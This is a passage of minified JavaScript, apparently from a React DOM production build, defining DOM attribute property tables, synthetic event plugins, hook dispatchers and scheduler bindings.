if(!bc(b))throw Error(k(200));return Kj(a,b,null,c)}if(!ea)throw Error(k(227));var ki=function(a,b,c,d,e,f,g,h,m){var n=Array.prototype.slice.call(arguments,3);try{b.apply(c,n)}catch(C){this.onError(C)}},yb=!1,gc=null,hc=!1,pd=null,li={onError:function(a){yb=!0;gc=a}},td=null,rf=null,mf=null,ic=null,cb={},jc=[],qd={},db={},rd={},wa=!("undefined"===typeof window||"undefined"===typeof window.document||"undefined"===typeof window.document.createElement),M=ea.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.assign,
sd=null,eb=null,fb=null,ee=function(a,b){return a(b)},eg=function(a,b,c,d,e){return a(b,c,d,e)},vd=function(){},vf=ee,Oa=!1,wd=!1,Z=ea.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.Scheduler,Lj=Z.unstable_cancelCallback,ff=Z.unstable_now,$f=Z.unstable_scheduleCallback,Mj=Z.unstable_shouldYield,Yh=Z.unstable_requestPaint,Pd=Z.unstable_runWithPriority,Nj=Z.unstable_getCurrentPriorityLevel,Oj=Z.unstable_ImmediatePriority,Zh=Z.unstable_UserBlockingPriority,ag=Z.unstable_NormalPriority,Pj=Z.unstable_LowPriority,
Qj=Z.unstable_IdlePriority,oi=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,wf=Object.prototype.hasOwnProperty,yf={},xf={},E={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(a){E[a]=
new L(a,0,!1,a,null,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(a){var b=a[0];E[b]=new L(b,1,!1,a[1],null,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(a){E[a]=new L(a,2,!1,a.toLowerCase(),null,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(a){E[a]=new L(a,2,!1,a,null,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(a){E[a]=
new L(a,3,!1,a.toLowerCase(),null,!1)});["checked","multiple","muted","selected"].forEach(function(a){E[a]=new L(a,3,!0,a,null,!1)});["capture","download"].forEach(function(a){E[a]=new L(a,4,!1,a,null,!1)});["cols","rows","size","span"].forEach(function(a){E[a]=new L(a,6,!1,a,null,!1)});["rowSpan","start"].forEach(function(a){E[a]=new L(a,5,!1,a.toLowerCase(),null,!1)});var gf=/[\-:]([a-z])/g,hf=function(a){return a[1].toUpperCase()};"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(a){var b=
a.replace(gf,hf);E[b]=new L(b,1,!1,a,null,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(a){var b=a.replace(gf,hf);E[b]=new L(b,1,!1,a,"http://www.w3.org/1999/xlink",!1)});["xml:base","xml:lang","xml:space"].forEach(function(a){var b=a.replace(gf,hf);E[b]=new L(b,1,!1,a,"http://www.w3.org/XML/1998/namespace",!1)});["tabIndex","crossOrigin"].forEach(function(a){E[a]=new L(a,1,!1,a.toLowerCase(),null,!1)});E.xlinkHref=new L("xlinkHref",1,
!1,"xlink:href","http://www.w3.org/1999/xlink",!0);["src","href","action","formAction"].forEach(function(a){E[a]=new L(a,1,!1,a.toLowerCase(),null,!0)});var da=ea.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;da.hasOwnProperty("ReactCurrentDispatcher")||(da.ReactCurrentDispatcher={current:null});da.hasOwnProperty("ReactCurrentBatchConfig")||(da.ReactCurrentBatchConfig={suspense:null});var si=/^(.*)[\\\/]/,Q="function"===typeof Symbol&&Symbol.for,Pc=Q?Symbol.for("react.element"):60103,gb=Q?Symbol.for("react.portal"):
60106,Ma=Q?Symbol.for("react.fragment"):60107,Af=Q?Symbol.for("react.strict_mode"):60108,kc=Q?Symbol.for("react.profiler"):60114,Cf=Q?Symbol.for("react.provider"):60109,Bf=Q?Symbol.for("react.context"):60110,Hj=Q?Symbol.for("react.concurrent_mode"):60111,zd=Q?Symbol.for("react.forward_ref"):60112,lc=Q?Symbol.for("react.suspense"):60113,yd=Q?Symbol.for("react.suspense_list"):60120,Ad=Q?Symbol.for("react.memo"):60115,Ef=Q?Symbol.for("react.lazy"):60116,Df=Q?Symbol.for("react.block"):60121,zf="function"===
typeof Symbol&&Symbol.iterator,od,xh=function(a){return"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(b,c,d,e){MSApp.execUnsafeLocalFunction(function(){return a(b,c,d,e)})}:a}(function(a,b){if("http://www.w3.org/2000/svg"!==a.namespaceURI||"innerHTML"in a)a.innerHTML=b;else{od=od||document.createElement("div");od.innerHTML="<svg>"+b.valueOf().toString()+"</svg>";for(b=od.firstChild;a.firstChild;)a.removeChild(a.firstChild);for(;b.firstChild;)a.appendChild(b.firstChild)}}),Wb=function(a,
b){if(b){var c=a.firstChild;if(c&&c===a.lastChild&&3===c.nodeType){c.nodeValue=b;return}}a.textContent=b},ib={animationend:nc("Animation","AnimationEnd"),animationiteration:nc("Animation","AnimationIteration"),animationstart:nc("Animation","AnimationStart"),transitionend:nc("Transition","TransitionEnd")},Id={},Of={};wa&&(Of=document.createElement("div").style,"AnimationEvent"in window||(delete ib.animationend.animation,delete ib.animationiteration.animation,delete ib.animationstart.animation),"TransitionEvent"in
window||delete ib.transitionend.transition);var $h=oc("animationend"),ai=oc("animationiteration"),bi=oc("animationstart"),ci=oc("transitionend"),Db="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Pf=new ("function"===typeof WeakMap?WeakMap:Map),Ab=null,wi=function(a){if(a){var b=a._dispatchListeners,c=a._dispatchInstances;
if(Array.isArray(b))for(var d=0;d<b.length&&!a.isPropagationStopped();d++)lf(a,b[d],c[d]);else b&&lf(a,b,c);a._dispatchListeners=null;a._dispatchInstances=null;a.isPersistent()||a.constructor.release(a)}},qc=[],Rd=!1,fa=[],xa=null,ya=null,za=null,Eb=new Map,Fb=new Map,Jb=[],Nd="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput close cancel copy cut paste click change contextmenu reset submit".split(" "),
yi="focus blur dragenter dragleave mouseover mouseout pointerover pointerout gotpointercapture lostpointercapture".split(" "),dg={},cg=new Map,Td=new Map,Rj=["abort","abort",$h,"animationEnd",ai,"animationIteration",bi,"animationStart","canplay","canPlay","canplaythrough","canPlayThrough","durationchange","durationChange","emptied","emptied","encrypted","encrypted","ended","ended","error","error","gotpointercapture","gotPointerCapture","load","load","loadeddata","loadedData","loadedmetadata","loadedMetadata",
"loadstart","loadStart","lostpointercapture","lostPointerCapture","playing","playing","progress","progress","seeking","seeking","stalled","stalled","suspend","suspend","timeupdate","timeUpdate",ci,"transitionEnd","waiting","waiting"];Sd("blur blur cancel cancel click click close close contextmenu contextMenu copy copy cut cut auxclick auxClick dblclick doubleClick dragend dragEnd dragstart dragStart drop drop focus focus input input invalid invalid keydown keyDown keypress keyPress keyup keyUp mousedown mouseDown mouseup mouseUp paste paste pause pause play play pointercancel pointerCancel pointerdown pointerDown pointerup pointerUp ratechange rateChange reset reset seeked seeked submit submit touchcancel touchCancel touchend touchEnd touchstart touchStart volumechange volumeChange".split(" "),
0);Sd("drag drag dragenter dragEnter dragexit dragExit dragleave dragLeave dragover dragOver mousemove mouseMove mouseout mouseOut mouseover mouseOver pointermove pointerMove pointerout pointerOut pointerover pointerOver scroll scroll toggle toggle touchmove touchMove wheel wheel".split(" "),1);Sd(Rj,2);(function(a,b){for(var c=0;c<a.length;c++)Td.set(a[c],b)})("change selectionchange textInput compositionstart compositionend compositionupdate".split(" "),0);var Hi=Zh,Gi=Pd,tc=!0,Kb={animationIterationCount:!0,
borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,
strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Sj=["Webkit","ms","Moz","O"];Object.keys(Kb).forEach(function(a){Sj.forEach(function(b){b=b+a.charAt(0).toUpperCase()+a.substring(1);Kb[b]=Kb[a]})});var Ii=M({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0}),ng="$",og="/$",$d="$?",Zd="$!",Ze=null,$e=null,We="function"===typeof setTimeout?setTimeout:void 0,vj="function"===
typeof clearTimeout?clearTimeout:void 0,jf=Math.random().toString(36).slice(2),Aa="__reactInternalInstance$"+jf,vc="__reactEventHandlers$"+jf,Lb="__reactContainere$"+jf,Ba=null,ce=null,wc=null;M(R.prototype,{preventDefault:function(){this.defaultPrevented=!0;var a=this.nativeEvent;a&&(a.preventDefault?a.preventDefault():"unknown"!==typeof a.returnValue&&(a.returnValue=!1),this.isDefaultPrevented=xc)},stopPropagation:function(){var a=this.nativeEvent;a&&(a.stopPropagation?a.stopPropagation():"unknown"!==
typeof a.cancelBubble&&(a.cancelBubble=!0),this.isPropagationStopped=xc)},persist:function(){this.isPersistent=xc},isPersistent:yc,destructor:function(){var a=this.constructor.Interface,b;for(b in a)this[b]=null;this.nativeEvent=this._targetInst=this.dispatchConfig=null;this.isPropagationStopped=this.isDefaultPrevented=yc;this._dispatchInstances=this._dispatchListeners=null}});R.Interface={type:null,target:null,currentTarget:function(){return null},eventPhase:null,bubbles:null,cancelable:null,timeStamp:function(a){return a.timeStamp||
Date.now()},defaultPrevented:null,isTrusted:null};R.extend=function(a){function b(){return c.apply(this,arguments)}var c=this,d=function(){};d.prototype=c.prototype;d=new d;M(d,b.prototype);b.prototype=d;b.prototype.constructor=b;b.Interface=M({},c.Interface,a);b.extend=c.extend;sg(b);return b};sg(R);var Tj=R.extend({data:null}),Uj=R.extend({data:null}),Ni=[9,13,27,32],de=wa&&"CompositionEvent"in window,cc=null;wa&&"documentMode"in document&&(cc=document.documentMode);var Vj=wa&&"TextEvent"in window&&
!cc,xg=wa&&(!de||cc&&8<cc&&11>=cc),wg=String.fromCharCode(32),ua={beforeInput:{phasedRegistrationNames:{bubbled:"onBeforeInput",captured:"onBeforeInputCapture"},dependencies:["compositionend","keypress","textInput","paste"]},compositionEnd:{phasedRegistrationNames:{bubbled:"onCompositionEnd",captured:"onCompositionEndCapture"},dependencies:"blur compositionend keydown keypress keyup mousedown".split(" ")},compositionStart:{phasedRegistrationNames:{bubbled:"onCompositionStart",captured:"onCompositionStartCapture"},
dependencies:"blur compositionstart keydown keypress keyup mousedown".split(" ")},compositionUpdate:{phasedRegistrationNames:{bubbled:"onCompositionUpdate",captured:"onCompositionUpdateCapture"},dependencies:"blur compositionupdate keydown keypress keyup mousedown".split(" ")}},vg=!1,mb=!1,Wj={eventTypes:ua,extractEvents:function(a,b,c,d,e){var f;if(de)b:{switch(a){case "compositionstart":var g=ua.compositionStart;break b;case "compositionend":g=ua.compositionEnd;break b;case "compositionupdate":g=
ua.compositionUpdate;break b}g=void 0}else mb?tg(a,c)&&(g=ua.compositionEnd):"keydown"===a&&229===c.keyCode&&(g=ua.compositionStart);g?(xg&&"ko"!==c.locale&&(mb||g!==ua.compositionStart?g===ua.compositionEnd&&mb&&(f=rg()):(Ba=d,ce="value"in Ba?Ba.value:Ba.textContent,mb=!0)),e=Tj.getPooled(g,b,c,d),f?e.data=f:(f=ug(c),null!==f&&(e.data=f)),lb(e),f=e):f=null;(a=Vj?Oi(a,c):Pi(a,c))?(b=Uj.getPooled(ua.beforeInput,b,c,d),b.data=a,lb(b)):b=null;return null===f?b:null===b?f:[f,b]}},Qi={color:!0,date:!0,
datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0},Ag={change:{phasedRegistrationNames:{bubbled:"onChange",captured:"onChangeCapture"},dependencies:"blur change click focus input keydown keyup selectionchange".split(" ")}},Mb=null,Nb=null,kf=!1;wa&&(kf=Tf("input")&&(!document.documentMode||9<document.documentMode));var Xj={eventTypes:Ag,_isInputEventSupported:kf,extractEvents:function(a,b,c,d,e){e=b?Pa(b):window;var f=
e.nodeName&&e.nodeName.toLowerCase();if("select"===f||"input"===f&&"file"===e.type)var g=Si;else if(yg(e))if(kf)g=Wi;else{g=Ui;var h=Ti}else(f=e.nodeName)&&"input"===f.toLowerCase()&&("checkbox"===e.type||"radio"===e.type)&&(g=Vi);if(g&&(g=g(a,b)))return zg(g,c,d);h&&h(a,e,b);"blur"===a&&(a=e._wrapperState)&&a.controlled&&"number"===e.type&&Ed(e,"number",e.value)}},dc=R.extend({view:null,detail:null}),Yi={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"},di=0,ei=0,fi=!1,gi=!1,ec=dc.extend({screenX:null,
screenY:null,clientX:null,clientY:null,pageX:null,pageY:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,getModifierState:fe,button:null,buttons:null,relatedTarget:function(a){return a.relatedTarget||(a.fromElement===a.srcElement?a.toElement:a.fromElement)},movementX:function(a){if("movementX"in a)return a.movementX;var b=di;di=a.screenX;return fi?"mousemove"===a.type?a.screenX-b:0:(fi=!0,0)},movementY:function(a){if("movementY"in a)return a.movementY;var b=ei;ei=a.screenY;return gi?"mousemove"===
a.type?a.screenY-b:0:(gi=!0,0)}}),hi=ec.extend({pointerId:null,width:null,height:null,pressure:null,tangentialPressure:null,tiltX:null,tiltY:null,twist:null,pointerType:null,isPrimary:null}),fc={mouseEnter:{registrationName:"onMouseEnter",dependencies:["mouseout","mouseover"]},mouseLeave:{registrationName:"onMouseLeave",dependencies:["mouseout","mouseover"]},pointerEnter:{registrationName:"onPointerEnter",dependencies:["pointerout","pointerover"]},pointerLeave:{registrationName:"onPointerLeave",dependencies:["pointerout",
"pointerover"]}},Yj={eventTypes:fc,extractEvents:function(a,b,c,d,e){var f="mouseover"===a||"pointerover"===a,g="mouseout"===a||"pointerout"===a;if(f&&0===(e&32)&&(c.relatedTarget||c.fromElement)||!g&&!f)return null;f=d.window===d?d:(f=d.ownerDocument)?f.defaultView||f.parentWindow:window;if(g){if(g=b,b=(b=c.relatedTarget||c.toElement)?Bb(b):null,null!==b){var h=Na(b);if(b!==h||5!==b.tag&&6!==b.tag)b=null}}else g=null;if(g===b)return null;if("mouseout"===a||"mouseover"===a){var m=ec;var n=fc.mouseLeave;
var l=fc.mouseEnter;var k="mouse"}else if("pointerout"===a||"pointerover"===a)m=hi,n=fc.pointerLeave,l=fc.pointerEnter,k="pointer";a=null==g?f:Pa(g);f=null==b?f:Pa(b);n=m.getPooled(n,g,c,d);n.type=k+"leave";n.target=a;n.relatedTarget=f;c=m.getPooled(l,b,c,d);c.type=k+"enter";c.target=f;c.relatedTarget=a;d=g;k=b;if(d&&k)a:{m=d;l=k;g=0;for(a=m;a;a=pa(a))g++;a=0;for(b=l;b;b=pa(b))a++;for(;0<g-a;)m=pa(m),g--;for(;0<a-g;)l=pa(l),a--;for(;g--;){if(m===l||m===l.alternate)break a;m=pa(m);l=pa(l)}m=null}else m=
null;l=m;for(m=[];d&&d!==l;){g=d.alternate;if(null!==g&&g===l)break;m.push(d);d=pa(d)}for(d=[];k&&k!==l;){g=k.alternate;if(null!==g&&g===l)break;d.push(k);k=pa(k)}for(k=0;k<m.length;k++)be(m[k],"bubbled",n);for(k=d.length;0<k--;)be(d[k],"captured",c);return 0===(e&64)?[n]:[n,c]}},Qa="function"===typeof Object.is?Object.is:Zi,$i=Object.prototype.hasOwnProperty,Zj=wa&&"documentMode"in document&&11>=document.documentMode,Eg={select:{phasedRegistrationNames:{bubbled:"onSelect",captured:"onSelectCapture"},
dependencies:"blur contextmenu dragend focus keydown keyup mousedown mouseup selectionchange".split(" ")}},nb=null,he=null,Pb=null,ge=!1,ak={eventTypes:Eg,extractEvents:function(a,b,c,d,e,f){e=f||(d.window===d?d.document:9===d.nodeType?d:d.ownerDocument);if(!(f=!e)){a:{e=Jd(e);f=rd.onSelect;for(var g=0;g<f.length;g++)if(!e.has(f[g])){e=!1;break a}e=!0}f=!e}if(f)return null;e=b?Pa(b):window;switch(a){case "focus":if(yg(e)||"true"===e.contentEditable)nb=e,he=b,Pb=null;break;case "blur":Pb=he=nb=null;
break;case "mousedown":ge=!0;break;case "contextmenu":case "mouseup":case "dragend":return ge=!1,Dg(c,d);case "selectionchange":if(Zj)break;case "keydown":case "keyup":return Dg(c,d)}return null}},bk=R.extend({animationName:null,elapsedTime:null,pseudoElement:null}),ck=R.extend({clipboardData:function(a){return"clipboardData"in a?a.clipboardData:window.clipboardData}}),dk=dc.extend({relatedTarget:null}),ek={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",
Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},fk={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",
224:"Meta"},gk=dc.extend({key:function(a){if(a.key){var b=ek[a.key]||a.key;if("Unidentified"!==b)return b}return"keypress"===a.type?(a=Ac(a),13===a?"Enter":String.fromCharCode(a)):"keydown"===a.type||"keyup"===a.type?fk[a.keyCode]||"Unidentified":""},location:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,repeat:null,locale:null,getModifierState:fe,charCode:function(a){return"keypress"===a.type?Ac(a):0},keyCode:function(a){return"keydown"===a.type||"keyup"===a.type?a.keyCode:0},which:function(a){return"keypress"===
a.type?Ac(a):"keydown"===a.type||"keyup"===a.type?a.keyCode:0}}),hk=ec.extend({dataTransfer:null}),ik=dc.extend({touches:null,targetTouches:null,changedTouches:null,altKey:null,metaKey:null,ctrlKey:null,shiftKey:null,getModifierState:fe}),jk=R.extend({propertyName:null,elapsedTime:null,pseudoElement:null}),kk=ec.extend({deltaX:function(a){return"deltaX"in a?a.deltaX:"wheelDeltaX"in a?-a.wheelDeltaX:0},deltaY:function(a){return"deltaY"in a?a.deltaY:"wheelDeltaY"in a?-a.wheelDeltaY:"wheelDelta"in a?
-a.wheelDelta:0},deltaZ:null,deltaMode:null}),lk={eventTypes:dg,extractEvents:function(a,b,c,d,e){e=cg.get(a);if(!e)return null;switch(a){case "keypress":if(0===Ac(c))return null;case "keydown":case "keyup":a=gk;break;case "blur":case "focus":a=dk;break;case "click":if(2===c.button)return null;case "auxclick":case "dblclick":case "mousedown":case "mousemove":case "mouseup":case "mouseout":case "mouseover":case "contextmenu":a=ec;break;case "drag":case "dragend":case "dragenter":case "dragexit":case "dragleave":case "dragover":case "dragstart":case "drop":a=
hk;break;case "touchcancel":case "touchend":case "touchmove":case "touchstart":a=ik;break;case $h:case ai:case bi:a=bk;break;case ci:a=jk;break;case "scroll":a=dc;break;case "wheel":a=kk;break;case "copy":case "cut":case "paste":a=ck;break;case "gotpointercapture":case "lostpointercapture":case "pointercancel":case "pointerdown":case "pointermove":case "pointerout":case "pointerover":case "pointerup":a=hi;break;default:a=R}b=a.getPooled(e,b,c,d);lb(b);return b}};(function(a){if(ic)throw Error(k(101));
ic=Array.prototype.slice.call(a);nf()})("ResponderEventPlugin SimpleEventPlugin EnterLeaveEventPlugin ChangeEventPlugin SelectEventPlugin BeforeInputEventPlugin".split(" "));(function(a,b,c){td=a;rf=b;mf=c})(ae,Hb,Pa);pf({SimpleEventPlugin:lk,EnterLeaveEventPlugin:Yj,ChangeEventPlugin:Xj,SelectEventPlugin:ak,BeforeInputEventPlugin:Wj});var ie=[],ob=-1,Ca={},B={current:Ca},G={current:!1},Ra=Ca,bj=Pd,je=$f,Rg=Lj,aj=Nj,Dc=Oj,Ig=Zh,Jg=ag,Kg=Pj,Lg=Qj,Qg={},yj=Mj,Cj=void 0!==Yh?Yh:function(){},qa=null,
Ec=null,ke=!1,ii=ff(),Y=1E4>ii?ff:function(){return ff()-ii},Ic={current:null},Hc=null,qb=null,Gc=null,Tg=0,Jc=2,Ga=!1,Vb=da.ReactCurrentBatchConfig,$g=(new ea.Component).refs,Mc={isMounted:function(a){return(a=a._reactInternalFiber)?Na(a)===a:!1},enqueueSetState:function(a,b,c){a=a._reactInternalFiber;var d=ka(),e=Vb.suspense;d=Va(d,a,e);e=Ea(d,e);e.payload=b;void 0!==c&&null!==c&&(e.callback=c);Fa(a,e);Ja(a,d)},enqueueReplaceState:function(a,b,c){a=a._reactInternalFiber;var d=ka(),e=Vb.suspense;
d=Va(d,a,e);e=Ea(d,e);e.tag=1;e.payload=b;void 0!==c&&null!==c&&(e.callback=c);Fa(a,e);Ja(a,d)},enqueueForceUpdate:function(a,b){a=a._reactInternalFiber;var c=ka(),d=Vb.suspense;c=Va(c,a,d);d=Ea(c,d);d.tag=Jc;void 0!==b&&null!==b&&(d.callback=b);Fa(a,d);Ja(a,c)}},Qc=Array.isArray,wb=ah(!0),Fe=ah(!1),Sb={},ja={current:Sb},Ub={current:Sb},Tb={current:Sb},D={current:0},Sc=da.ReactCurrentDispatcher,X=da.ReactCurrentBatchConfig,Ia=0,z=null,K=null,J=null,Uc=!1,Tc={readContext:W,useCallback:S,useContext:S,
useEffect:S,useImperativeHandle:S,useLayoutEffect:S,useMemo:S,useReducer:S,useRef:S,useState:S,useDebugValue:S,useResponder:S,useDeferredValue:S,useTransition:S},dj={readContext:W,useCallback:ih,useContext:W,useEffect:eh,useImperativeHandle:function(a,b,c){c=null!==c&&void 0!==c?c.concat([a]):null;return ze(4,2,gh.bind(null,b,a),c)},useLayoutEffect:function(a,b){return ze(4,2,a,b)},useMemo:function(a,b){var c=ub();b=void 0===b?null:b;a=a();c.memoizedState=[a,b];return a},useReducer:function(a,b,c){var d=
ub();b=void 0!==c?c(b):b;d.memoizedState=d.baseState=b;a=d.queue={pending:null,dispatch:null,lastRenderedReducer:a,lastRenderedState:b};a=a.dispatch=ch.bind(null,z,a);return[d.memoizedState,a]},useRef:function(a){var b=ub();a={current:a};return b.memoizedState=a},useState:xe,useDebugValue:Be,useResponder:ue,useDeferredValue:function(a,b){var c=xe(a),d=c[0],e=c[1];eh(function(){var c=X.suspense;X.suspense=void 0===b?null:b;try{e(a)}finally{X.suspense=c}},[a,b]);return d},useTransition:function(a){var b=
xe(!1),c=b[0];b=b[1];return[ih(Ce.bind(null,b,a),[b,a]),c]}},ej={readContext:W,useCallback:Yc,useContext:W,useEffect:Xc,useImperativeHandle:hh,useLayoutEffect:fh,useMemo:jh,useReducer:Vc,useRef:dh,useState:function(a){return Vc(Ua)},useDebugValue:Be,useResponder:ue,useDeferredValue:function(a,b){var c=Vc(Ua),d=c[0],e=c[1];Xc(function(){var c=X.suspense;X.suspense=void 0===b?null:b;try{e(a)}finally{X.suspense=c}},[a,b]);return d},useTransition:function(a){var b=Vc(Ua),c=b[0];b=b[1];return[Yc(Ce.bind(null,
b,a),[b,a]),c]}},fj={readContext:W,useCallback:Yc,useContext:W,useEffect:Xc,useImperativeHandle:hh,useLayoutEffect:fh,useMemo:jh,useReducer:Wc,useRef:dh,useState:function(a){return Wc(Ua)},useDebugValue:Be,useResponder:ue,useDeferredValue:function(a,b){var c=Wc(Ua),d=c[0],e=c[1];Xc(function(){var c=X.suspense;X.suspense=void 0===b?null:b;try{e(a)}finally{X.suspense=c}},[a,b]);return d},useTransition:function(a){var b=Wc(Ua),c=b[0];b=b[1];return[Yc(Ce.bind(null,b,a),[b,a]),c]}},ra=null,Ka=null,Wa=
!1,gj=da.ReactCurrentOwner,ia=!1,Je={dehydrated:null,retryTime:0};var jj=function(a,b,c,d){for(c=b.child;null!==c;){if(5===c.tag||6===c.tag)a.appendChild(c.stateNode);else if(4!==c.tag&&null!==c.child){c.child.return=c;c=c.child;continue}if(c===b)break;for(;null===c.sibling;){if(null===c.return||c.return===b)return;c=c.return}c.sibling.return=c.return;c=c.sibling}};var wh=function(a){};var ij=function(a,b,c,d,e){var f=a.memoizedProps;if(f!==d){var g=b.stateNode;Ta(ja.current);a=null;switch(c){case "input":f=
Cd(g,f);d=Cd(g,d);a=[];break;case "option":f=Fd(g,f);d=Fd(g,d);a=[];break;case "select":f=M({},f,{value:void 0});d=M({},d,{value:void 0});a=[];break;case "textarea":f=Gd(g,f);d=Gd(g,d);a=[];break;default:"function"!==typeof f.onClick&&"function"===typeof d.onClick&&(g.onclick=uc)}Ud(c,d);var h,m;c=null;for(h in f)if(!d.hasOwnProperty(h)&&f.hasOwnProperty(h)&&null!=f[h])if("style"===h)for(m in g=f[h],g)g.hasOwnProperty(m)&&(c||(c={}),c[m]="");else"dangerouslySetInnerHTML"!==h&&"children"!==h&&"suppressContentEditableWarning"!==
h&&"suppressHydrationWarning"!==h&&"autoFocus"!==h&&(db.hasOwnProperty(h)?a||(a=[]):(a=a||[]).push(h,null));for(h in d){var k=d[h];g=null!=f?f[h]:void 0;if(d.hasOwnProperty(h)&&k!==g&&(null!=k||null!=g))if("style"===h)if(g){for(m in g)!g.hasOwnProperty(m)||k&&k.hasOwnProperty(m)||(c||(c={}),c[m]="");for(m in k)k.hasOwnProperty(m)&&g[m]!==k[m]&&(c||(c={}),c[m]=k[m])}else c||(a||(a=[]),a.push(h,c)),c=k;else"dangerouslySetInnerHTML"===h?(k=k?k.__html:void 0,g=g?g.__html:void 0,null!=k&&g!==k&&(a=a||
[]).push(h,k)):"children"===h?g===k||"string"!==typeof k&&"number"!==typeof k||(a=a||[]).push(h,""+k):"suppressContentEditableWarning"!==h&&"suppressHydrationWarning"!==h&&(db.hasOwnProperty(h)?(null!=k&&oa(e,h),a||g===k||(a=[])):(a=a||[]).push(h,k))}c&&(a=a||[]).push("style",c);e=a;if(b.updateQueue=e)b.effectTag|=4}};var kj=function(a,b,c,d){c!==d&&(b.effectTag|=4)};var pj="function"===typeof WeakSet?WeakSet:Set,wj="function"===typeof WeakMap?WeakMap:Map,sj=Math.ceil,gd=da.ReactCurrentDispatcher,
Uh=da.ReactCurrentOwner,H=0,Ye=8,ca=16,ma=32,Xa=0,hd=1,Oh=2,ad=3,bd=4,Xe=5,p=H,U=null,t=null,P=0,F=Xa,id=null,ta=1073741823,Yb=1073741823,kd=null,Xb=0,jd=!1,Re=0,Ph=500,l=null,cd=!1,Se=null,La=null,ld=!1,Zb=null,$b=90,bb=null,ac=0,af=null,dd=0,Ja=function(a,b){if(50<ac)throw ac=0,af=null,Error(k(185));a=ed(a,b);if(null!==a){var c=Cc();1073741823===b?(p&Ye)!==H&&(p&(ca|ma))===H?Te(a):(V(a),p===H&&ha()):V(a);(p&4)===H||98!==c&&99!==c||(null===bb?bb=new Map([[a,b]]):(c=bb.get(a),(void 0===c||c>b)&&bb.set(a,
